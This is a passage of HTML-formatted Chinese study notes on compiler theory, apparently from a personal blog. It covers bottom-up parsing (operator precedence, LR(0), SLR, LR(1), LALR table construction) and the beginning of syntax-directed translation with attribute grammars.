class="keyword">else</span> <span class="keyword">ERROR</span></span><br><span class="line"><span class="keyword">END</span> of <span class="keyword">while</span></span><br><span class="line"><span class="keyword">STOP</span>/*分析成功，过程完毕*/</span><br></pre></td></tr></table></figure><h3 id="自底向上语法分析"><a href="#自底向上语法分析" class="headerlink" title="自底向上语法分析"></a>自底向上语法分析</h3><p><strong>原理</strong>：<strong>自左向右</strong>扫描，<strong>自下而上</strong>分析</p><p>从输入符号串入手，通过反复查找当前句型的可归约串，并使用文法的产生式把他归约成相应的非终结符来一步步地进行分析。最终把输入串归约成文法的开始符号，表明分析成功。</p><ul><li>任何自下而上分析方法的关键就是要找出当前句型的可归约串，然后根据产生式判别将它归约成什么样的非终结符。</li></ul><h4 id="规范归约基本概念"><a href="#规范归约基本概念" class="headerlink" title="规范归约基本概念"></a>规范归约基本概念</h4><p>G为文法，S为开始符号，假定α，β，δ是G的一个句型，如果 S =*=&gt; αAδ 且 A=+=&gt; β，</p><p>则称 β 是句型 α β δ 相对于非终结符A的短语。</p><p>如果 A &rArr; β ，则称β是句型 α β δ 相对于A的直接短语。</p><p>最左直接短语称为句柄。</p><p>从句子到开始符号的归约序列，如果每一步都是把句柄替换为相应产生式的左部符号而得到的，则称为<strong>规范归约</strong>。规范归约是最右推导（规范推导）的逆过程。</p><blockquote><p>例：：考虑文法G(E)：E→E +T |T<br>                                       T→T*F | F<br>                                        F→i| (E)<br> 并假定输入串为（i+i)*i，考察自下而上的分析过程</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\12.jpg" alt></p><p><strong>栈上的候选式不一定是句柄</strong>。例如，在第14步对栈顶为T，它是E的一候选式，但它不是句柄，不能归约成E。判定候选式是极为简单的事情，但判定句柄就不那么容易。而不同的自底向上方法给出不同的判定方法。</p></blockquote><p>自下而上方法包括四个方法：</p><ul><li>移进(shift)：把输入流的头符读到分析栈中</li><li>归约(Reduction)：把分析栈顶的句柄归约为一非终结符</li><li>接受：分析成功</li><li>报错：处理错误</li></ul><h4 id="算符优先分析"><a href="#算符优先分析" class="headerlink" title="算符优先分析"></a>算符优先分析</h4><p>首先规定文法符号之间的优先关系和结合性质，然后再利用这种关系，通过比较两个相邻的符号之间的优先顺序来确定可归约串。</p><p>算符文法：任何产生式的右部都不含两个相继的非终结符</p><blockquote><p> 优先关系：</p><p>终结符ab的三种优先关系：</p><ul><li>a = b：当且仅当存在形如下面的产生式 U &rarr; … ab … 或 U &rarr; …aQb …</li><li>a &lt; b：当且仅当存在形如下面的产生式 U &rarr; …aW… 的产生式，且有 W =+=&gt; b…</li><li>a &gt; b：当且仅当存在形如下面的产生式 U &rarr; …Vb… 的产生式，且有 V=+=&gt;…a 或                V =*=&gt;…aQ</li></ul></blockquote><h5 id="如何从文法构造优先关系表"><a href="#如何从文法构造优先关系表" class="headerlink" title="如何从文法构造优先关系表"></a>如何从文法构造优先关系表</h5><p>检查文法产生式的每个候选，可找出所有满足 = 的终结符对。</p><p>对于每个非终结符 P 构造两个集合 FIRSTVT(P) 和 LASTVT(P) </p><p>FisrtVt(P) = { a | P =+=&gt; a… 或  P =+=&gt; Qa… ，a ∈ V<sub>T</sub> ，Q ∈ V<sub>N </sub> }</p><p>LastVt(P) = { a | P =+=&gt; …a 或 P =+=&gt; …aQ ，a∈V<sub>T</sub> ，Q ∈ V<sub>N</sub>  }</p><p>检查每个产生式的候选，若形如 …aP… ，则对任意b ∈ FisrtVt(P) ，我们有 a&lt;b</p><p>若形如 …Pb… ，则对任何a ∈ LastVt(P)，我们有 a&gt;b</p><p>对表达式文法的非终结符构造 FirstVt 和 LastVt 并建立优先关系表</p><h5 id="算符优先分析算法"><a href="#算符优先分析算法" class="headerlink" title="算符优先分析算法"></a>算符优先分析算法</h5><p>素短语：这样的一个短语，他至少包含一个终结符，不含比自身更小的素短语</p><p>最左素短语：句型最左边的素短语</p><p>定理：算法优先文法的句型 #N<sub>1</sub>a<sub>1</sub>N<sub>2</sub>a<sub>2</sub>……N<sub>n</sub>a<sub>n</sub>N<sub>n+1</sub># 的最左素短语是满足如下条件的最左子串   N<sub>j</sub>a<sub>j</sub>……N<sub>i</sub>a<sub>i</sub>N<sub>i+1</sub> ， a<sub>j-1</sub> &lt; a<sub>j</sub> ， a<sub>j</sub>  =   a<sub>j+1</sub>  =  a<sub>i</sub>   ， a<sub>i</sub>  &gt;  a<sub>i+1</sub>   </p><h5 id="优先函数"><a href="#优先函数" class="headerlink" title="优先函数"></a>优先函数</h5><h4 id="LR分析法"><a href="#LR分析法" class="headerlink" title="LR分析法"></a>LR分析法</h4><ul><li>LR(K)分析是指<strong>自左向右扫描</strong>和<strong>自下而上</strong>的语法分析，且在分析的每一步，只须根据分析栈中当前<strong>已移进</strong>和<strong>归约</strong>出的<strong>全部文法符号</strong>，并至<strong>多再向前查看K个输入符号</strong>，就能确定相当于某一产生式右部符号的句柄是否已在分析栈的顶部形成。从而也就可以确定所应采取的分析动作（是移进输入符号还是按某产生式进行归约）。</li></ul><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># X1X2 …… Xi …… Xn Xn<span class="string">+1</span> Xn<span class="string">+2</span> …… Xn+k Xn+k<span class="string">+1</span> …… #</span><br><span class="line">44  |-------||----------------|</span><br><span class="line">444 栈顶   扫描器的缓冲区 </span><br><span class="line">444 扫到Xn<span class="string">+1</span>,向前查看k个符号,来确定是把Xn<span class="string">+1</span>移进栈,还是把Xi…Xn作为句柄进行归约</span><br><span class="line"></span><br><span class="line">1) 要归约时，则根据某产生式 U → XiXi<span class="string">+1</span>……Xn 进行归约: #X1X2 …… Xi<span class="string">-1</span> U Xn<span class="string">+1</span>Xn<span class="string">+2</span> …… Xn+k …… #</span><br><span class="line"></span><br><span class="line">2)要移进时，即把Xn<span class="string">+1</span>进栈，并读入下一符号: #X1X2 …… Xi …… XnXn<span class="string">+1</span>   Xn<span class="string">+2</span> …… Xn+k …… #</span><br><span class="line">44444444444|---| |---|   |-|</span><br><span class="line">44444444444栈中Xi  栈顶(Xn<span class="string">+1</span>) 当前扫描符(Xn<span class="string">+2</span>)</span><br></pre></td></tr></table></figure><ul><li>LR(0)：表示再每一步分析时都不用向前输入符号</li><li>LR(1)：表示再每一步分析时都向前看一个输入符号来决定当前的动作</li><li>SLR(1)：表示简单的LR(1)，即只在动作不唯一的地方向前看一个符号，在动作唯一时则不向前看输入符号</li></ul><h5 id="LR分析器的逻辑结构及工作流程"><a href="#LR分析器的逻辑结构及工作流程" class="headerlink" title="LR分析器的逻辑结构及工作流程"></a>LR分析器的逻辑结构及工作流程</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\13.jpg" alt></p><p>如图为LR分析器的逻辑结构，所有LR分析器的总控程序大致相同，只有分析表（即Go-Action表）不相同。</p><ul><li><strong>规范LR分析表构造法</strong>：用此法构造的分析表功能最强而且也适合很多文法，但是实现代价较高</li><li><strong>简单LR（即SLR）分析表构造法</strong>：比较容易实现的方法，但SLR分析表功能太弱，而且对某些文法可能根本就构造不出相应的SLR分析表</li><li><strong>向前LR（即LALR）分析表构造法</strong>：这种方法构造的分析表功能介于规范LR分析表和SLR分析表之间。这种表适用于绝大多数的程序语言文法，而且也可以设法有效实现</li></ul><h5 id="LR的分析过程"><a href="#LR的分析过程" class="headerlink" title="LR的分析过程"></a>LR的分析过程</h5><p>两个栈：状态栈，符号栈</p><p><strong>移进：</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\14.jpg" alt></p><p><strong>归约：</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\15.jpg" alt></p><p><strong>接受&amp;报错：</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\16.jpg" alt></p><p>所以各种LR分析器的最大区别在于其分析表，分析表决定了每一步该如何移进或者归约，直至接受，或者中途报错。</p><h5 id="LR-0-分析表的构造"><a href="#LR-0-分析表的构造" class="headerlink" title="LR(0)分析表的构造"></a>LR(0)分析表的构造</h5><p>1.规范句型的活前缀</p><p><strong>前缀：</strong>一个符号串的前缀是指该串的任意首部(包括ε)。</p><p>​        例：abc的前缀为：ε，a，ab，abc</p><p>归约时，归约前和归约后的被归约部分与剩余部分合起来仅构成文法的规范句型，而用哪个产生式归约仅取决于当前句型的前面部分；X1X2…Xn[p]，其中Xi为文法的符号，[p]为第p个产生式序号</p><ul><li>我们把规范句型的这种前端部分的串称为活前缀。实际上，它们恰好是符号栈栈顶形成句柄时符号栈中的内容。</li></ul><p><strong>活前缀：</strong>是指规范句型的一个前缀，这种前缀不含句柄之后的任何符号。</p><ul><li>这是因为一旦句型的句柄在符号栈顶形成，将会<strong>立即被归约</strong>之故。所以我们将规范句型具有上述性质（不含句柄之后的任何符号）的前缀称之为活前缀。</li></ul><p>在规范归约过程中的任何时候只要已分析过的部分即在符号栈中的符号串为规范句型的活前缀，表明输入串的已被分析过的部分是该文法某规范句型的一个正确部分。</p><ul><li><strong>定义</strong>：若 S=<sup>*</sup><sub>R</sub>&rArr; αAω =<sub>R</sub>&rArr; αβω 是文法G的一个规范推导，如果符号串γ是    αβ 的前缀，则称γ是G的一个<strong>活前缀</strong>。其中S为文法开始符号</li></ul><h5 id="LR-0-项目"><a href="#LR-0-项目" class="headerlink" title="LR(0)项目"></a>LR(0)项目</h5><blockquote><p> 活前缀和句柄间的关系：</p><p> (1) 活前缀中已含有句柄的全部符合（句柄的最后符号就是活前缀的最后符号）</p><p> (2) 活前缀只含有句柄的前部分符号（句柄的最左子串为活前缀的最右子串）</p><p> (3) 活前缀中全然不包括句柄的任何符号</p></blockquote><p>(1) 表明：此时某一产生式 A &rarr; β 的右部 β 已出现在符号栈顶，因此此时相应的分析动作应当是用此产生式进行<strong>归约</strong>。</p><p>(2) 表明：形如 A &rarr; β<sub>1</sub> β<sub>2</sub>  的产生式的右部子串已在符号栈栈顶了，如 β<sub>1</sub> ，正期待着从余留输入串中能看到由β推出的符号串，即期待 β<sub>2</sub> 进栈以便能进行归约。故此时分析动作是<strong>移进</strong>当前输入符号</p><p>(3) 表明：期望从余留输入串中能看到某产生式 A &rarr; α 的右部，即α所代表的符号串（即句柄），所以此时分析的动作也是读输入符进符号栈。</p><p>在产生式的右部相应位置上加一个圆点 <code>.</code> ，来指示识别位置，标明在 <code>.</code> 前的部分已被识别</p><p>如 (1)  A &rarr; β<code>.</code>          (2)  A &rarr;  β<sub>1</sub><code>.</code>β<sub>2</sub>           (3)  A &rarr; <code>.</code>α</p><p>右部某位置上标有圆点的产生式称为LR(0)项目(item)。</p><p>不同的LR(0)项目，反映了分析过程中符号栈顶的不同情况。</p><p>每个项目的意义与圆点的位置有关</p><p>圆点左边的子串表示在分析过程的某一时刻用该产生式归约时句柄中已识别过的部分，圆点右边的子串表示待识别的部分</p><p>文法的全部LR(0)项目将是构造他的所有活前缀的有穷自动机的基础</p><h6 id="LR-0-项目的分类"><a href="#LR-0-项目的分类" class="headerlink" title="LR(0)项目的分类"></a>LR(0)项目的分类</h6><ul><li><code>A → α.</code>：表明右部符号串已出现在栈顶，此时相应的分析动作应当是按此产生式进行归约，此种项目称为<strong>规约项目</strong>。</li><li><code>S&#39; → S.</code>：称为<strong>接受项目</strong>。</li><li><code>A → α.Xβ</code>：其中α可以为ε，当X为终结符时，相应的分析动作应将当前的符号移入栈中，将此项目称为<strong>移进项目</strong>。</li><li><code>A → α.Xβ</code>：其中α可以为ε，当X为非终结符时，期待从余留的输入符中进行归约后而得到X，此类项目称为<strong>待约项目</strong>。</li></ul><p>把<strong>终结符和非终结符</strong>都可看成一个有限自动机的<strong>输入符号</strong>，每把一个符号进栈相当于已识别过该符号，而状态进行转换（到下一个状态），当识别到可归约前缀时相当于栈顶已形成句柄，则认为达到了识别句柄的终态。、</p><p>==&gt;&gt;&gt;<strong>构造识别活前缀的DFA</strong>：DFA中的每一个状态由若干个LR(0)项目所组成的集合(称为项目集)来表示。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">举例：构造识别前缀的DFA</span><br><span class="line">用I0表示这个DFA的初态，</span><br><span class="line">将项目S'→<span class="string">.S</span>列入项目集I0。</span><br><span class="line">将项目S→<span class="string">.A</span>和S→<span class="string">.B</span>加入I0中。</span><br><span class="line">将A→<span class="string">.aAb</span>和A→<span class="string">.c</span>和B→<span class="string">.aBb</span>, B→<span class="string">.d</span>加入I0中。</span><br><span class="line"></span><br><span class="line">项目集I0将由如下项目组成：</span><br><span class="line">I0 :   S'→<span class="string">.S</span>,   S→<span class="string">.A</span>,  S→<span class="string">.B</span>,  A→<span class="string">.aAb</span>, A→<span class="string">.c</span>,   B→<span class="string">.aBd</span>,   B→<span class="string">.d</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; S'→<span class="string">.S</span>称为项目集I0的基本项目，从基本项目出发构造项目集I0的过程，可用closure<span class="params">(&#123;S'→.S&#125;)</span>表示。</span><br></pre></td></tr></table></figure><h5 id="closure-I-的定义"><a href="#closure-I-的定义" class="headerlink" title="closure(I)的定义:"></a>closure(I)的定义:</h5><p>Closure(I) = I ∪ { A → .μ | A → μ∈G ∧ K→ α.Aβ∈closure(I) ∧ α∈V<em>∧β∈V</em>}</p><p>构造closure(I)的算法:<br>1）I 中的每一个项目都属于 closure(I)<br>2）若形如 K→α.Aβ 的项目属于I，且 A→μ 是文法的一个产生式，任何形如 A→.μ 的项目也应加到 closure(I) 中<br>3）重复上述过程，直至不再有新的项目加入到closure(I)中为止。      </p><p>如何确定从I0可能转移到的下一状态？</p><p>若I0中有项目 K→a <strong>.</strong>Ab，从输入串识别出A后，进入下一状态。设此状态为 I<sub>i</sub>  ，显然 I<sub>i</sub> 中必含有形如 K→aA <strong>.</strong>b 的项目，称为 K→a <strong>.</strong>Ab 的<strong>后继项目</strong>。后继项目组成集合 J，则J中的每个项目都是项目集 I<sub>i</sub> 的<strong>基本项目</strong>，有： I<sub>i</sub>  =closure( J )</p><h5 id="定义状态转移函数：GOTO-I-A-closure-J"><a href="#定义状态转移函数：GOTO-I-A-closure-J" class="headerlink" title="定义状态转移函数：GOTO(I,A)=closure(J)"></a>定义<strong>状态转移函数</strong>：<code>GOTO(I,A)=closure(J)</code></h5><p>其中，I 是当前状态，A为文法符号，J 是 I 中所有形如K→a<strong>.</strong>Ab的项目之后继项目K→aA<strong>.</strong>b所组成的集合，而closure(J)就是项目集 I（即状态I)关于符号A的后继项目集（即后继状态）。</p><p>将G[S’]的全部项目集称为文法G[S’]的LR(0)项目集规范族，并记为C=(I<sub>0</sub> ，I<sub>1</sub> ，I<sub>2</sub> ，……，I<sub>n</sub> )</p><p>识别文法G[S’]的全部活前缀的DFA为 M = ( C，V，GoTo ， I<sub>0</sub> ， Z )</p><p>其中，C：M的状态集，即文法G[S’] 的LR(0) 项目集规范族 I<sub>0</sub> ~~~ I<sub>n</sub> </p><p>V：M的字母表，即在M中的所有符号</p><p>GoTo：M的状态转换函数，即上述的GoTo函数</p><p>I<sub>0</sub> ：M的唯一初态</p><p>Z：M的终态集，Z &sub; C 为规范族中所有含有<strong>规约项目</strong>的那些项目集</p><p>例如下图：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">文法G<span class="string">':</span></span><br><span class="line"><span class="string">(0) S'</span> → S</span><br><span class="line"><span class="comment">(1)</span> S → A</span><br><span class="line"><span class="comment">(2)</span> S → B</span><br><span class="line"><span class="comment">(3)</span> A → aAb</span><br><span class="line"><span class="comment">(4)</span> A → c</span><br><span class="line"><span class="comment">(5)</span> B → aBd</span><br><span class="line"><span class="comment">(6)</span> B → d</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler/17.jpg" alt></p><p>如上为一个DFA，通过读入字符进行状态转换，以及在每个状态内进行closure闭包。</p><h4 id="LR-0-分析表构造"><a href="#LR-0-分析表构造" class="headerlink" title="LR(0)分析表构造"></a>LR(0)分析表构造</h4><p>要求每一个项目集中的的诸项目<strong>不出现</strong>下列的情况：</p><ul><li><p>（1）移进项目和归约项目并存，即存在<strong>移进—归约冲突</strong>；</p></li><li><p>（2）多个归约项目并存，即存在<strong>归约—归约冲突</strong>。</p></li></ul><p>​          如果一个文法G满足上述条件，也就是它的每个LR(0)项目集中都不含有冲突的项目，则称G为LR(0)文法。</p><p>只有当一个文法是LR(0)文法时，才能对它构造不含冲突动作的LR(0)分析表。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">构造LR<span class="params">(0)</span>分析表的算法为：</span><br><span class="line">     <span class="params">(1)</span>对于每一项目集Ii中形如A→α<span class="string">.X</span>β的项目，且有GO<span class="params">(Ii,X)</span>=Ij,</span><br><span class="line">444若X为一终结符号 a 时，则置ACTION[i,a]=Sj;</span><br><span class="line">444若X为一非终结符号时，则置GOTO[i,X]=j</span><br><span class="line">     <span class="params">(2)</span>若Ii中有归约项目A→α. ,设A→α为文法第j个产生式，则对文法的任何终结符和“<span class="comment">#”（均记为a）,置ACTION[i,a]=Rj</span></span><br><span class="line">     <span class="params">(3)</span>若接受项目S'→S .属于Ii ,则置ACTION[i,<span class="comment">#]=acc。</span></span><br><span class="line">4 <span class="params">(4)</span>在分析表中,凡不能按上述规则填入信息的元素,均置为“出错”。</span><br><span class="line">4 </span><br><span class="line"></span><br><span class="line">如上图的DFA可构造分析表为:</span><br><span class="line"></span><br><span class="line">                 ACTIONGOTO</span><br><span class="line">44abcd<span class="comment">#S    A    B</span></span><br><span class="line">0S4S5S61    2    3</span><br><span class="line">1Acc</span><br><span class="line">2R1R1R1R1R1</span><br><span class="line">3R2R2R2R2R2</span><br><span class="line">4S4S5S6  7  9</span><br><span class="line">5R4R4R4R4R4</span><br><span class="line">6R6R6R6R6R6</span><br><span class="line">7S8</span><br><span class="line">8R3R3R3R3R3</span><br><span class="line">9S10</span><br><span class="line">10R5R5R5R5R5</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 表中Ri代表用第i个产生式归约,Si代表移进Action表的第i行</span><br></pre></td></tr></table></figure><p>分析器的工作过程如下：</p><p><strong>根据输入串当前符号 a 和 分析栈栈顶状态 i 查找分析表应采取的动作：</strong></p><p>1）若ACTION[i,a]=Sj, a∈V<sub>T</sub> ,则把 a <strong>移进</strong>符号栈， j <strong>移进</strong>状态栈。</p><p>2）若ACTION[i,a]=Rj，a∈V<sub>T</sub> 或 # ，则用第j个产生式<strong>归约</strong>。并将两个栈的指针减去K(其中，<strong>K为第j 个产生式右部的串长度</strong>），并把产生式的左部符号A压入符号栈，同时用符号对（ S<sub>i-k</sub> , A )去查GOTO表（其中S<sub>i-k</sub> 为状态栈当前栈顶元素，若 GOTO[S<sub>i-k</sub> ,A] = j ,则j压入状态栈，使得两个栈内的元素一样多。</p><p>3）若ACTION[i,a]=Acc,（此时a应为“#”号），则表明<strong>分析成功</strong>，结束分析。</p><p>4）若ACTION[i,a]=空白，转<strong>出错处理</strong>。</p><h4 id="SLR分析表构造"><a href="#SLR分析表构造" class="headerlink" title="SLR分析表构造"></a>SLR分析表构造</h4><p>大多数程序设计语言的文法不是LR(0)文法。</p><p>对LR(0)规范族中有冲突的项目集（状态）用向前查 看一个（输入）符号的办法进行处理，以解决冲突。即为SLR(1)。</p><p>SLR(1) 分析表构造与LR(0) 分析表构造基本相同</p><p>SLR(1) 之所以是1，是因为向前看了一步Follow集。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">假定有一个LR(<span class="number">0</span>)规范族中含有如下项目集(状态)I:</span><br><span class="line"></span><br><span class="line">I=&#123;X→<span class="selector-tag">a</span>.bβ , A→g. , B→d.&#125;其中<span class="selector-tag">a</span>,<span class="selector-tag">b</span>,g,d为符号串，b∈VT ,I中含有移进—归约和归约—归约冲突。</span><br><span class="line"></span><br><span class="line">只要FOLLOW(A)和FOLLOW(B)互不相交，且都不包含<span class="selector-tag">b</span>,即:</span><br><span class="line"><span class="function"><span class="title">FOLLOW</span><span class="params">(A)</span></span>∩FOLLOW(B)=φ</span><br><span class="line"><span class="function"><span class="title">FOLLOW</span><span class="params">(A)</span></span>∩&#123;b&#125;=φ</span><br><span class="line"><span class="function"><span class="title">FOLLOW</span><span class="params">(B)</span></span>∩&#123;b&#125;=φ</span><br><span class="line"></span><br><span class="line">当状态I面临某输入符号a时，则动作为：</span><br><span class="line"><span class="number">1</span>）若<span class="selector-tag">a</span> = <span class="selector-tag">b</span>,则移进。</span><br><span class="line"><span class="number">2</span>）若<span class="selector-tag">a</span> ∈ FOLLOW(A),则用产生式A→g归约。</span><br><span class="line"><span class="number">3</span>）若<span class="selector-tag">a</span> ∈ FOLLOW(B),则用产生式B→d归约。</span><br></pre></td></tr></table></figure><p>一般地，对于LR(0)规范族的一个项目集I可能含有多个移进项目和多个归约项目，我们可假设项目集I中有m个移进项目： A1→a1<strong>.</strong> b1b1, A2→ a2<strong>.</strong> b2b2, …, Am→ am<strong>.</strong> bmbm;同时含有n个归约项目：B1→g1<strong>.</strong> , B2→ g2<strong>.</strong> ,…, Bn→ gn<strong>.</strong> ,只要集合{b1, b2,…bm}和FOLLOW(B1),FOLLOW(B2),…,FOLLOW(Bn) 两两交集都为空，则我们仍可用上述归则来解决冲突：</p><p> 1）若a∈{b1, b2,…,bm},则移进。</p><p> 2）若a∈FOLLOW(Bi),i=1,…,n，则用 Bi→ gi 进行归约。</p><p> 3）此外，则报错。</p><h5 id="SLR分析表构造方法"><a href="#SLR分析表构造方法" class="headerlink" title="SLR分析表构造方法"></a>SLR分析表构造方法</h5><p>(1) 对于每一项目集Ii中形如A.X的项目，且有GOTO(Ii,X)=Ij,   若X为一终结符号a时，则置ACTION[I,a]=S;   若X为一非终结符号时，则仅置GOTO[i,X]=j；</p><p>(2) 若归约项目A→α<strong>.</strong> 属于Ii,设A→α为文法第j个行产生式，则对任何属于FOLLOW(A)的输入符号a,置ACTION[i,a]=Rj；</p><p>(3) 若接受项目S’ → S<strong>.</strong>属于Ii ,则置ACTION[i,#]=acc。</p><p>(4) 在分析表,凡不能按上述规则填入信息的元素,均置为“出错”。</p><p>（例：TODO：后面补充，ppt–Bottom-Up–P42-47）</p><h5 id="规范LR分析表构造"><a href="#规范LR分析表构造" class="headerlink" title="规范LR分析表构造"></a>规范LR分析表构造</h5><p>SLR(1) 方法：若状态K含有 <code>A ➡ α.</code>，若 α ∈ Follow(A) ，则用 <code>A ➡ α.</code> 归约</p><p>当状态Ix下，有产生式<code>A ➡ α.</code> 和<code>A ➡ α. = …</code>，此时，SLR(0)不知道是将此归约成A还是移进至=，若没有其他情况能产生=，则这里产生移进归约冲突，导致错误！！！</p><h5 id="LR-1-项目"><a href="#LR-1-项目" class="headerlink" title="LR(1)项目"></a>LR(1)项目</h5><p>(A→a<strong>.</strong> β，x) 表示： a在栈顶，输入串头部可由βx导出。</p><p>LR(1)的状态：LR(1)项目的集合</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">该算法为:</span><br><span class="line">      令初态: Closure( (S’→.S，<span class="comment">#) )</span></span><br><span class="line">      </span><br><span class="line">Closure(I)=</span><br><span class="line">    <span class="keyword">repeat</span></span><br><span class="line">        <span class="keyword">for</span> any <span class="built_in">item</span>( A→α.Xβ ，z) <span class="keyword">in</span> I</span><br><span class="line">            <span class="keyword">for</span> any production X →γ</span><br><span class="line">                <span class="keyword">for</span> any w∈FIRST(βz)</span><br><span class="line">                          I←I∪&#123;X → .γ, w&#125;</span><br><span class="line">    <span class="keyword">until</span> I <span class="keyword">does</span> <span class="keyword">not</span> change</span><br><span class="line"></span><br><span class="line">GO (I,X)=</span><br><span class="line">    J ←&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> any <span class="built_in">item</span>(A→α.Xβ，z) <span class="keyword">in</span> I</span><br><span class="line">        add ( A→αX.β，z )  <span class="keyword">to</span> J</span><br><span class="line"><span class="built_in">    return</span> Closure(J)</span><br></pre></td></tr></table></figure><h5 id="LALR分析表的构造"><a href="#LALR分析表的构造" class="headerlink" title="LALR分析表的构造"></a>LALR分析表的构造</h5><p>同心项目集：除去搜索符之外都相同的LR(1)项目集</p><p>合并同心项目集不会产生新的移进-归约冲突</p><p>将 LR(1) 合并同心项目集，如果没有归约-归约冲突，则为LALR(1)文法。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\18.jpg" alt></p><blockquote><p><a href="https://www.cnblogs.com/henuliulei/p/10872483.html" target="_blank" rel="noopener">参考，各语法分析器的区别</a></p></blockquote><blockquote><p> 各文法的区别：</p><ul><li>LL(1)就是向前只搜索1个符号，即与FIRST()匹配，如果FIRST为空则还要考虑Follow集</li><li>>&gt;&gt;见到First集就移进，见到Follow集就归约。</li><li>LR(0):见到<strong>First集就移进</strong>，见到终态就归约</li><li>SLR(1)见到<strong>First集就移进</strong>，见到<strong>终态先看Follow集</strong>，与Follow集<strong>对应的项目归约</strong>，其它报错。</li><li>>&gt;&gt;SLR分析法包含的展望信息是体现在利用了Follow(A)信息，可以解决“归约－归约”冲突</li><li>SLR分析法没有包含足够的展望信息，不能完成解决“移进－归约”冲突，需要改进。</li><li>LALR同心集合并不会产生“移进－归约”冲突 ，但会产生“归约－归约”冲突</li><li>LR(1)</li></ul></blockquote><h2 id="语法制导的翻译（Syntax-Directed-Translation）"><a href="#语法制导的翻译（Syntax-Directed-Translation）" class="headerlink" title="语法制导的翻译（Syntax-Directed Translation）"></a>语法制导的翻译（Syntax-Directed Translation）</h2><p>一种语义描述方法：语法制导的翻译</p><p>语法制导翻译采用上下文无关文法来引导对语言的翻译，是一种<strong>面向文法</strong>的翻译技术</p><p>语法制导翻译=语法分析+语义分析+中间代码生成</p><p>语义翻译 = 语义分析 + 中间代码生成</p><h3 id="属性文法"><a href="#属性文法" class="headerlink" title="属性文法"></a>属性文法</h3><p>如何表示语义信息？为文法符号设置语义属性，用来表示语法成分对应的语义信息。</p><p>语法制导定义：是对上下文无关文法的推广，将每个文法符号和一个语义属性集合相关联，将每个产生式和一组语义规则相关联，这些用于计算该产生式中各文法符号的属性值</p><h4 id="属性文法定义的形式"><a href="#属性文法定义的形式" class="headerlink" title="属性文法定义的形式"></a>属性文法定义的形式</h4><ul><li>基础文法</li><li>每个文法符号有一组属性</li><li><p>每个文法产生式 <code>A ➡ α</code> 有一组形式为 <code>b := f(c1,c2,……,ck)</code> 的语义规则，其中 f 是函数，b和c1,c2,……,ck是该产生式文法符号的属性</p><blockquote><ul><li><p>综合属性：如果b是A的属性，c1,c2……,ck是产生式右部文法符号的属性或A的其他属性</p></li><li><p>继承属性：如果b是产生式右部某个文法符号X的属性</p></li></ul></blockquote></li></ul><p>文法符号的属性分为：综合属性和继承属性。</p><h4 id="综合属性（Synthesized-Attribute）"><a href="#综合属性（Synthesized-Attribute）" class="headerlink" title="综合属性（Synthesized Attribute）"></a>综合属性（Synthesized Attribute）</h4><p><strong>S属性定义</strong>：仅仅使用综合属性的语法制导定义</p><p>例：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\19.jpg" alt></p><p>语法分析树如下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\20.jpg" alt></p><p>分析树的各节点属性的计算自下而上完成</p><h4 id="继承属性（Inherited-Attribute）"><a href="#继承属性（Inherited-Attribute）" class="headerlink" title="继承属性（Inherited Attribute）"></a>继承属性（Inherited Attribute）</h4><p>例：语法规则如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\21.jpg" alt></p><p>分析树如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler/22.jpg" alt></p><p>分析树的依赖图如下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\23.jpg" alt></p><p>其中，L ➡ L<sub>1</sub> ，id ； 